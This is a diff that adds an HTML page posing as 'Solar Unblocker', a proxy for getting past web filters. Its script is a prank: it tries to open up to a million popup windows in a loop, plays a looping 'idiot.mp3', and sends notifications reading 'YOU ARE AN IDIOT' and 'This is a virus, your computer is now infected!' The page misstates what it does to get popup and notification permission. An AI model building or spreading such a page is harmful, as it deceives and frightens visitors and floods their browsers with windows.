@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solar Unblocker</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #101014;
+    color: white;
+    font-family: Arial, sans-serif;
+}
+
+.container {
+    text-align: center;
+    background: #1b1b23;
+    padding: 40px;
+    border-radius: 18px;
+    width: min(90%, 430px);
+}
+
+h1 {
+    margin-bottom: 10px;
+}
+
+p {
+    color: #aaa;
+    line-height: 1.6;
+}
+
+button {
+    background: #6c5ce7;
+    border: none;
+    color: white;
+    padding: 15px 25px;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 15px;
+}
+
+button:hover {
+    background: #8174f5;
+}
+
+#status {
+    margin-top: 20px;
+    font-size: 13px;
+    color: #aaa;
+}
+</style>
+</head>
+
+<body>
+
+<!-- BACKGROUND MUSIC -->
+<audio id="backgroundMusic" loop>
+    <source src="idiot.mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
+
+    <h1>✨ Solar Unblocker</h1>
+
+    <p>
+        Get ready for the unblocker. 
+        This website will open several small windows
+        end notifications to update you to the newest proxy. 
+    </p>
+
+    <p>
+        Your browser may ask you to allow popups
+        and notifications.
+    </p>
+
+    <button onclick="startExperience()">
+        Start Solar Unblocker
+    </button>
+
+    <div id="status">Waiting to start...</div>
+
+</div>
+
+<script>
+
+// =================================
+// CUSTOM SETTINGS
+// =================================
+
+const IMAGE_PATH = "satisfying.png";
+
+const POPUP_COUNT = 1000000;
+
+const NOTIFICATION_COUNT = 1000000;
+
+// =================================
+// MAIN FUNCTION
+// =================================
+
+async function startExperience() {
+
+    alert("Please allow popups and redirects");
+
+    const status = document.getElementById("status");
+
+    // Start background music
+    const music = document.getElementById("backgroundMusic");
+
+    if (music) {
+        music.volume = 0.35;
+        music.play().catch(() => {});
+    }
+
+    // Request notification permission
+    if (!("Notification" in window)) {
+        status.textContent = "Notifications are not supported.";
+        return;
+    }
+
+    let permission = Notification.permission;
+
+    if (permission === "default") {
+        permission = await Notification.requestPermission();
+    }
+
+    // Open popup windows
+    let opened = 0;
+
+    for (let i = 0; i < POPUP_COUNT; i++) {
+
+        const popup = window.open(
+            "",
+            "_blank",
+            "width=350,height=300"
+        );
+
+        if (!popup) continue;
+
+        opened++;
+
+        popup.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Satisfying!</title>
+
+                <style>
+                    body {
+                        margin: 0;
+                        background: #111;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        overflow: hidden;
+                    }
+
+                    img {
+                        max-width: 100%;
+                        max-height: 100%;
+                        object-fit: contain;
+                    }
+                </style>
+
+            </head>
+
+            <body>
+                <img src="${IMAGE_PATH}" alt="Image">
+            </body>
+            </html>
+        `);
+
+        popup.document.close();
+    }
+
+    // Send notifications
+    if (permission === "granted") {
+
+        // Keep notification count within a reasonable limit.
+        const count = Math.min(
+            Math.max(0, Math.floor(NOTIFICATION_COUNT)),
+            5
+        );
+
+        for (let i = 0; i < count; i++) {
+
+            new Notification("YOU ARE AN IDIOT", {
+                body: "This is a virus, your computer is now infected!",
+                icon: IMAGE_PATH,
+                tag: "satisfying-" + i
+            });
+
+        }
+
+        status.textContent =
+            opened + " popup(s) opened. " +
+            count + " notifications requested!";
+
+    } else {
+
+        status.textContent =
+            opened + " popup(s) opened. " +
+            "Notifications were not allowed.";
+
+    }
+
+}
+
+</script>
+
+</body>
+</html>
